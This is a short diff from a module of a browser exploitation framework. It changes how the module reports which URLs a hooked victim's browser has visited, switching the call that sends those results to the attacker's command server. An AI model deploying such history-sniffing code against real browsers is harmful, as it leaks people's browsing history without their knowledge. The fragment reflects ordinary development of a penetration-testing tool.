@@ -5,6 +5,6 @@ beef.execute(function() {
 	{
 		comp += results[i].url+' = '+results[i].visited+'  ';
 	}
-	beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result="+comp);
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, comp);
 });
 
